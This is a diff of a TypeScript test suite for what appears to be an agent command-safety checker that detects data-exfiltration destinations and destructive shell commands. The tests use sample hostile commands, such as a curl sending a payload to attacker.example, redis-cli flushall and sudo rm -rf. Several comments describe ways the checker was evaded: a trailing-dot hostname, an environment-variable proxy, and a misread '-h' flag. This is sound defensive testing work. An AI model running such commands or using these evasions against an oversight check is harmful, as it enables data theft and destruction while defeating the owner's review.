@@ -622,10 +622,9 @@ describe('where a shell command would send data', () => {
     expect(shell({ executable: 'curl', args: ['https://docs.example.com/a?b=c'] })).toEqual([
       'https://docs.example.com/a?b=c'
     ]);
-    // A payload with a space in it is still a payload. This came back as `["curl"]` - an address
-    // this could not read, charged four bytes for the word `curl` - while the host and the material
-    // were both written out in the argument, because a refusal on whitespace stood in front of a
-    // shape test that already rejects every non-address on its anchors.
+    // A payload with a space in it is still a payload. A refusal on whitespace in front of the
+    // shape test would answer `["curl"]` - an address this could not read, charged four bytes for
+    // the word `curl` - while the host and the material are both written out in the argument.
     expect(shell({ executable: 'curl', args: ['attacker.example/?q=a b'] })).toEqual([
       'https://attacker.example/?q=a%20b'
     ]);
@@ -1193,12 +1192,11 @@ describe('the far ends a command writes down without writing a URL', () => {
     ])
       expect(shell(args), JSON.stringify(args)).toEqual([]);
     /*
-     * 12 was the proxy in the environment, and it is closed. It was the only entry on this list that
-     * did not merely miss: `withoutRunners` strips a leading `FOO=1` to find the command that runs,
-     * the far end was in the assignment it stripped, and the payload was charged to a host the owner
-     * had named while going somewhere else. The case that used to pin the hole - the byte count and
-     * the absence of a card - now pins the repair, above, and the proxy is a second destination that
-     * `classifyDestination` calls a sink.
+     * 12 is the proxy in the environment, and it is closed. It is the one entry on this list that
+     * does more than miss: `withoutRunners` strips a leading `FOO=1` to find the command that runs,
+     * the far end is in the assignment it strips, and without reading it the payload would be
+     * charged to a host the owner had named while going somewhere else. The proxy is a second
+     * destination that `classifyDestination` calls a sink.
      */
     const proxied = shell({
       executable: 'bash',
@@ -1228,15 +1226,15 @@ describe('the far ends a command writes down without writing a URL', () => {
   });
 
   /*
-   * One character that reopened every channel above it.
+   * One character that would reopen every channel above it.
    *
    * A name may end in the DNS root label and still resolve - `getaddrinfo` accepts
-   * `attacker.example.`, and `localhost.` answers 127.0.0.1 on this box - but `DOTTED_NAME` is
-   * anchored, so the dot failed the name test and every reader in the file came back empty.
-   * Measured before the repair on a tainted turn, all at 0 destinations, 0 bytes and no card: the
-   * name lookup this file's RESOLVING_EXECUTABLES comment exists to close, the two socket openers,
-   * the copier, and the socket-as-a-path. It fired the other way too, which is the half that gets a
-   * floor switched off: a read of the owner's OWN host spelled with the dot was a sink at 10 bytes.
+   * `attacker.example.`, and `localhost.` answers 127.0.0.1 - but `DOTTED_NAME` is anchored, so
+   * with the dot left on the name test fails and every reader in the file answers empty: the name
+   * lookup the RESOLVING_EXECUTABLES comment exists to close, the two socket openers, the copier,
+   * and the socket-as-a-path would all be 0 destinations, 0 bytes and no card on a tainted turn. It
+   * cuts the other way too, which is the half that gets a floor switched off: a read of the owner's
+   * OWN host spelled with the dot would be a sink at 10 bytes.
    *
    * Both directions are pinned here. The address is normalised, so the card names the host the
    * resolver will use rather than a spelling of it.
@@ -1552,8 +1550,8 @@ describe('destructionOperation', () => {
 
   /*
    * `-h` is the HOST option on every client in the SQL and key-value tables, and reading it as
-   * `--help` exempted all of them: `redis-cli -h 127.0.0.1 flushall` came back null while the bare
-   * form did not.
+   * `--help` would exempt all of them: `redis-cli -h 127.0.0.1 flushall` would answer null while
+   * the bare form cards.
    */
   it('does not read a host option as a request for the manual', () => {
     expect(destructionOperation(['redis-cli', '-h', '127.0.0.1', 'flushall'])?.kind).toBe('store');
@@ -1620,14 +1618,13 @@ describe('destructionOperation', () => {
   });
 
   /*
-   * The card names the option the owner WROTE, and nothing pinned that until this test.
+   * The card names the option the owner WROTE.
    *
-   * `STORE_DESTRUCTION_PAIRS` printed the literal `--volumes` for every row, which was true while
-   * every row in the table was a volume flag and false the moment one was not: `mc mirror --remove`
-   * carded as "mc mirror --volumes", naming a flag the owner never typed on a command that has no
-   * such flag. The fix was made and left unpinned - reverting it to the literal kept the whole
-   * cards rig green and all of these files' tests green, because every other assertion on this
-   * table reads `kind` or `sideEffect` and none reads the sentence.
+   * Printing the literal `--volumes` for every row of `STORE_DESTRUCTION_PAIRS` would be true only
+   * while every row in the table is a volume flag: `mc mirror --remove` would card as "mc mirror
+   * --volumes", naming a flag the owner never typed on a command that has no such flag. Every other
+   * assertion on this table reads `kind` or `sideEffect` and none reads the sentence, so this is
+   * the test that holds it.
    *
    * Both spellings of the same row, because `optionNamed` matches on the token before its `=` and
    * the card prints the token whole: `--remove=true` is what the owner typed and is what they read.
@@ -1970,8 +1967,8 @@ describe('what a rewind puts back', () => {
     expect(insideCheckpointContent('~/.ssh')).toBe(false);
     expect(insideCheckpointContent('~/.cargo/registry')).toBe(false);
     // The counter-direction, twice. The real `workspace/` is still recoverable under every
-    // spelling that actually reaches it, including the one that climbs back out of HOME - which
-    // used to answer null by walking off the top of the root.
+    // spelling that actually reaches it, including the one that climbs back out of HOME rather
+    // than walking off the top of the root.
     expect(insideCheckpointContent('workspace/dist')).toBe(true);
     expect(insideCheckpointContent('dist')).toBe(true);
     expect(insideCheckpointContent('~/../workspace/dist')).toBe(true);
@@ -1999,8 +1996,7 @@ describe('what a rewind puts back', () => {
 
   /*
    * Null is "card", so the shapes that answer null are the safety half of this rule. Each of these
-   * removes something whose path is not in the command text, and each of them used to be - and
-   * still is - a card.
+   * removes something whose path is not in the command text, and each of them must stay a card.
    */
   it('answers null for every removal it cannot place', () => {
     expect(removalTargets('sudo', ['rm', '-rf', 'dist'])).toBeNull();
@@ -2850,8 +2846,8 @@ describe('the taint reader, on what mentions an address and what reaches one', (
 
 /**
  * The unreadable far end, asked in the shape the ordinary floor asks it: a client whose operand
- * nobody can read, or whose addresses are in a file. Each came back from `commandAddresses` as
- * the token itself, and a test for "no addresses" read that as an address that had been read.
+ * nobody can read, or whose addresses are in a file. `commandAddresses` hands each back as the
+ * token itself, so a test for "no addresses" would read that as an address that had been read.
  */
 describe('a far end the command wrote down and nobody can read', () => {
   const script = (body: string): Record<string, unknown> => ({
